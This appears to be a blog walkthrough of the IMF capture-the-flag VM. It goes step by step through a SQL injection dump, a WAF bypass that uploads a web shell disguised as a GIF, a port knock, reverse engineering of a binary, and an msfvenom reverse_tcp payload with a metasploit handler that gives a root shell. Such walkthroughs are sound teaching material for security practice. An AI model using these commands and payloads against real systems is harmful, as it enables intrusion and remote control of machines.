---
title: 'Hack the IMF VM (CTF Challenge)'
date: 2019-12-08T18:45:00+01:00
draft: false
---

Hello friends! Today we are going to take another CTF challenge known as IMF. The credit for making this vm machine goes to “Geckom” and it is another CTF challenge where we have to find **6** **flags** to complete the challenge. You can download this VM **[here](https://www.vulnhub.com/entry/imf-1,162/#download)**.  
**Let’s Breach!!!**  
Let us start form getting to know the IP of VM (Here, I have it at **192.168.0.25 **but you will have to find your own)  
**netdiscover**  
![](https://i1.wp.com/2.bp.blogspot.com/-CxnpIAiLqeg/Wb_XzLRkStI/AAAAAAAAReE/K_H59IacdOk-aUsp_ekkYgh8xJaAYozggCEwYBhgL/s1600/1.png?w=687&ssl=1)  
Use nmap for port enumeration  
**nmap -sV  192.168.0.25**  
![](https://i1.wp.com/4.bp.blogspot.com/-pYmxz7lmgNo/Wb_X28atYmI/AAAAAAAAReE/PcVi0HYT20QWRpz3v-FimJYBqCXdvty0ACEwYBhgL/s1600/2.png?w=687&ssl=1)  
We find port 80 is open, so we open the ip address in our browser.  
![](https://i0.wp.com/4.bp.blogspot.com/-p3nV7UzlYdg/Wb_X6AFC-OI/AAAAAAAAReE/f8xpDiSNaKwCgcNFyeZjCIaaVNSDMtflgCEwYBhgL/s1600/3.png?w=687&ssl=1)  
We take a look at our source code and found a few javascript files that look like base64 encoded.  
![](https://i0.wp.com/3.bp.blogspot.com/-FWs_crpER4A/Wb_X8XAZbUI/AAAAAAAAReE/cmxetp4XTn0iCwo3nlSYuXlSKOt13xQRACEwYBhgL/s1600/4.png?w=687&ssl=1)  
We open them and find nothing interesting but when we join their name and decode them we find our 2nd flag.  
Inside the flag we find another base64 encode string, decoding it we find a string called imfadministrator.  
![](https://i1.wp.com/4.bp.blogspot.com/-8IBVwwArDrc/Wb_X8gvL4kI/AAAAAAAAReE/bLpALglYVFoWX7hMrhcqlOynaldL76e2gCEwYBhgL/s1600/5.png?w=687&ssl=1)  
We take a look around the website and in the source code of contact.php page we find our 1st flag.  
![](https://i0.wp.com/1.bp.blogspot.com/-SMAs_CcUakE/Wb_X9LhhnPI/AAAAAAAAReE/D14q6LRPBjk-NcG299K7B-9zI_M8C_8fwCEwYBhgL/s1600/6.png?w=687&ssl=1)  
Flag 1 contains a base64 encoded string decoding it we find a string called allthefiles.  
We open **allthefiles** and **imfadministrator** on the browser. We find that imfadministrator is a directory that leads to a login page.  
![](https://i1.wp.com/1.bp.blogspot.com/-900gIyIQnHw/Wb_X9eM0iKI/AAAAAAAAReE/Wjh4dm5oOM4sIn8E955EQlczYgYXeKFdACEwYBhgL/s1600/7.png?w=687&ssl=1)  
In the contact.php page we found a few email addresses so we use cewl to make a dictionary.  
![](https://i0.wp.com/1.bp.blogspot.com/-D716L5WSUgw/Wb_X9X4oRGI/AAAAAAAAReE/9p7GEbPh-K8Bv_CqVlEF4mOs8TlpwFMKQCEwYBhgL/s1600/8.png?w=687&ssl=1)  
We use burpsuite to launch a dictionary attack. We select the position and change the password from string to array.  
![](https://i0.wp.com/3.bp.blogspot.com/-RKvGwm4VAoM/Wb_X95vHPHI/AAAAAAAAReE/H-5sR2FUNpQjNy0x6nqAAetZrQuMw1eAwCEwYBhgL/s1600/9.png?w=687&ssl=1)  
Now we find the third flag in our response, when the login is successful.  
![](https://i0.wp.com/3.bp.blogspot.com/-TT9JAhY3vwU/Wb_XyxHsNzI/AAAAAAAAReE/DYjEx5y7EH0Ic9dGju1Phv34oLWAobEvQCEwYBhgL/s1600/10.png?w=687&ssl=1)  
Now that we can access the page we see that the page might be vulnerable to sql injection.  
![](https://i1.wp.com/3.bp.blogspot.com/-h7zZRXb12CE/Wb_XzFmEx2I/AAAAAAAAReE/d2yJDXMCNKwUBJCK5jNb-ehWqVQ48hnDACEwYBhgL/s1600/11.1.png?w=687&ssl=1)  
Using burpsuite we capture the request of this page and save it in a text file.  
![](https://i0.wp.com/4.bp.blogspot.com/-Jg_KfWBJG18/Wb_Xz03nRAI/AAAAAAAAReE/qmjPRqLswJcU4czpOQZKGwVPqYoYLoFvQCEwYBhgL/s1600/11.png?w=687&ssl=1)  
We use sqlmap to dump the database.  
**sqlmap -r /root/Desktop/imf.txt –dbs –batch –dump-all**  
![](https://i2.wp.com/1.bp.blogspot.com/-Q02kZGhyue0/Wb_X0BEfyHI/AAAAAAAAReE/wVEV14zvWvAUVuOs7-CzwhI3Y-JP_pi9ACEwYBhgL/s1600/12.png?w=687&ssl=1)  
We find the name of the pages along with another page called tutorial-incomplete. We open it on our browser and find a page with QR-code inside an image.  
![](https://i0.wp.com/4.bp.blogspot.com/-HK_2ZvHVHgY/Wb_X0Py1KNI/AAAAAAAAReE/zcKZ68yWZSQltZ6U77Y4noMzEGHLvNeJQCEwYBhgL/s1600/13.png?w=687&ssl=1)  
When we decode the QR-code we our 4th flag.  
![](https://i0.wp.com/4.bp.blogspot.com/-6bfPrnpYvwI/Wb_X1MwtoqI/AAAAAAAAReE/a3q-DDi6SC4dW399USLn3QxyC-M7FavMACEwYBhgL/s640/14.1.png?w=687&ssl=1)  
Inside our flag we find a base64 encoded string, when we decode it we find a string called uploadr942.php           
We open it on our browser and find a page to upload a file.  
![](https://i0.wp.com/4.bp.blogspot.com/-WlZmf0P2sjk/Wb_X1LhsvzI/AAAAAAAAReE/t5CExBa9fHwhWHOf1ekGKhKBaK4IbfhVwCEwYBhgL/s1600/14.2.png?w=687&ssl=1)  
Now while uploading a shell we find that it is protected from WAF, so we create a custom shell and save it as GIF file to bypass the WAF.  
![](https://i2.wp.com/4.bp.blogspot.com/-P1tyjZB08N0/Wb_X1Kqb3eI/AAAAAAAAReE/yi-tM3cruLYx1sshwjnCpT96bYezNTbegCEwYBhgL/s1600/14.3.png?w=687&ssl=1)  
Now we upload the file and check the response from the server to find where our file is uploaded.  
![](https://i2.wp.com/4.bp.blogspot.com/-6pZ6AuVYZ8c/Wb_X105ukMI/AAAAAAAAReE/9jJUdxCZakwnMi7H-mtIDDRIt6LyQAAcwCEwYBhgL/s1600/14.png?w=687&ssl=1)  
We find server sends a string in a comment, we find our file is in **uploads** folder and the comment in the response sent by server is the name of our file.  
![](https://i0.wp.com/2.bp.blogspot.com/-RvY7sAPXHH0/Wb_X2fz3C8I/AAAAAAAAReE/VlmEyPEOiZwwnWEmU72R2Cb5vn3UcPAkACEwYBhgL/s1600/15.png?w=687&ssl=1)  
After finding our shell, we find 5th flag. Now we use web\_delivery to take reverse shell using metasploit.  
![](https://i0.wp.com/2.bp.blogspot.com/-yXWdUs4PH_c/Wb_X2uneRQI/AAAAAAAAReE/dozv7DjtuCwN311uDA_6sFrhaol2Vq69wCEwYBhgL/s1600/16.png?w=687&ssl=1)  
We setup our metasploit for web delivery and execute the command on our shell.  
![](https://i1.wp.com/2.bp.blogspot.com/-brat1xvZ0JY/Wb_X3KNlHCI/AAAAAAAAReE/9Utf8stI6tkjQnc907CGr_rg6lEc6gg7QCEwYBhgL/s1600/20.png?w=687&ssl=1)  
Now that we have the reverse shell we take a look inside 5th flag  
![](https://i1.wp.com/2.bp.blogspot.com/-zcZJ576Y4wA/Wb_X4J8k-PI/AAAAAAAAReE/xTjCWivKZjAoOsX780rvhqYhZwgH8oF5QCEwYBhgL/s1600/24.1.png?w=687&ssl=1)  
We find a base64 encode string when we decode it we find a string agentservices.  
We check the connections of our server using netstat  
**netstat -antp**  
![](https://i0.wp.com/3.bp.blogspot.com/-8ZXcMxPP-ZE/Wb_X3C9GkOI/AAAAAAAAReE/Y3AkGUXsr78Uf9HUG4OmDYXlT66dCqIwgCEwYBhgL/s1600/22.png?w=687&ssl=1)  
We found a service running on port 7788, we use curl to find what the server is running on port 7788.  
**curl localhost:7788**  
![](https://i2.wp.com/1.bp.blogspot.com/-_h0VaVnfnBQ/Wb_X3dCAV2I/AAAAAAAAReE/7mnETJi3QMQCRXxps9RdsRB2bP2FGUnrgCEwYBhgL/s1600/23.png?w=687&ssl=1)  
We find a service called agent is running so we find the location of agent using which command  
**which agent**  
![](https://i2.wp.com/4.bp.blogspot.com/-ypA0LbTDEss/Wb_X4NwIpQI/AAAAAAAAReE/3H7K9SaL1_Yzh_X0PUliwQtKjtbfZhOFACEwYBhgL/s1600/24.png?w=687&ssl=1)  
When we move into the folder we found a file called **access\_codes**, we open it and find a few numbers. It looks like a sequence for port knock.  
So we knock the server and find that port 7788 opened.  
**Knock 192.168.0.25 7482 8279 9467**  
![](https://i1.wp.com/4.bp.blogspot.com/-dVyjUtRlgM0/Wb_X4Su2qFI/AAAAAAAAReE/zcMCGmfIzEgbxs9Q3yOa3SUaJzc2hu0AQCEwYBhgL/s1600/25.png?w=687&ssl=1)  
Now we download agent program file to our system for reverse engineering.  
**download agent /root/Desktop**  
![](https://i0.wp.com/4.bp.blogspot.com/-QDV4ckVht1Y/Wb_X4zp4CMI/AAAAAAAAReE/8BQHL1IwZr8U3yPZTdWS-51GelUBHtFjwCEwYBhgL/s1600/26.png?w=687&ssl=1)  
Now we reverse engineer the file to find an exploit. First we disassemble main function.  
**gdb -q agent**  
**disassemble main**  
![](https://i0.wp.com/4.bp.blogspot.com/--kTIYNi6DgU/Wb_X5J-ojLI/AAAAAAAAReE/oPLqNAYmFJ8CDvDcFBgwUA8qP3JaBbGJQCEwYBhgL/s1600/27.png?w=687&ssl=1)  
We find that at memory address **80486ba**, string compare function takes place so we add a break point there.  
![](https://i0.wp.com/4.bp.blogspot.com/-CZIIAem-AW4/Wb_X5BgW1ZI/AAAAAAAAReE/TKWigufnDeABoSmbAc_QMHHI9hWbX3WCQCEwYBhgL/s1600/28.png?w=687&ssl=1)  
We break the program at **80486ba**, and run the program. After running the programs, we look at the memory locations associated with the program.  
**break \*0x80486ba**  
**info registers**  
![](https://i1.wp.com/3.bp.blogspot.com/-lcFO7G-FqWY/Wb_X5m-DV-I/AAAAAAAAReE/_FMJ3LV_SUUlAov-X5k0MTUacgvSJvXRQCEwYBhgL/s1600/29.png?w=687&ssl=1)  
We look inside four halfwords of memory above starck pointer  
**x/4xw 0xffffd340**  
![](https://i1.wp.com/2.bp.blogspot.com/-SiXWeqByIZw/Wb_X55t9I7I/AAAAAAAAReE/ZAjgplTQMkYzL1JJtg_t-gLsZ3qHwniRwCEwYBhgL/s1600/30.png?w=687&ssl=1)  
In the memory address 804c070 we found the password to access the program.  
**x/s 0x0804c070**  
![](https://i1.wp.com/1.bp.blogspot.com/--ZmsPsVkeGQ/Wb_X6tTfm3I/AAAAAAAAReE/snb5ljoCAJEzV7A2Nzlm_k0QmEVa2MrcACEwYBhgL/s1600/31.png?w=687&ssl=1)  
Now we access the program from the server using netcat and find that the string can give us access to the program  
**netcat 192.168.0.25 7788**  
![](https://i2.wp.com/4.bp.blogspot.com/-HpMdRhYFzQM/Wb_X6xhNu9I/AAAAAAAAReE/SRAAKgxHlzknDMBjSY_giyZLOOvI6Hh5wCEwYBhgL/s1600/32.png?w=687&ssl=1)  
Now we create an exploit for this program, first we create a shellcode for msfvenom payload.  
**msfvenom –p linux/x86/meterpreter/reverse\_tcp lhost=192.168.0.15 lport=4444 –f python –b \\x00\\xa0\\x0d**  
![](https://i1.wp.com/3.bp.blogspot.com/-1-KccChLoF8/Wb_X6z6QoLI/AAAAAAAAReE/_Ki8Z9VtDlUUKUeyoUyPRaMIunrPc40bQCEwYBhgL/s1600/33.png?w=687&ssl=1)  
Now we create our exploit using python. We manually fuzz the memory location inside our exploit.  
**![](https://i0.wp.com/1.bp.blogspot.com/-NqR33fzhJKY/Wb_X7c6qdyI/AAAAAAAAReE/VUzxL7nH5FwfCo6kyCGzJ27O1eRR4qXzACEwYBhgL/s1600/34.png?w=687&ssl=1)**  
We setup our handler on metesploit and execute the shell.  
**msf > use exploit/multi/handler**  
**msf exploit (handler) > set payload linux/x86/meterpreter/reverse\_shell**  
**msf exploit (handler) > set lhost 192.168.0.15**  
**msf exploit (handler) > set lport 4444**  
**msf exploit (handler) > run**  
![](https://i2.wp.com/3.bp.blogspot.com/-yyz7a1nTY64/Wb_X7tVY06I/AAAAAAAAReE/XnLfiugoV-Av-zEI-MHkMphBVizjNPIvACEwYBhgL/s1600/35.png?w=687&ssl=1)  
now we check for sessions and take the interactive shell  
**msf exploit (handler) > sessions**  
**msf exploit (handler) > sessions -i 3**  
![](https://i0.wp.com/1.bp.blogspot.com/-0oN8zAI4OWc/Wb_X79hWzFI/AAAAAAAAReE/5TPEoJ3fCw8ZahtQ62PQkVSoNLmJJzyOACEwYBhgL/s1600/36.png?w=687&ssl=1)  
Now we take shell check our privileges, we find that we are root. When we move inside the /root/ folder we find our 6th and final flag.  
![](https://i1.wp.com/4.bp.blogspot.com/-LkTpeLk_M9A/Wb_X8RKgEpI/AAAAAAAAReE/VI-lWVpyb0sXOYBKpOB6yFx_Gi-LwhIrQCEwYBhgL/s1600/37.png?w=687&ssl=1)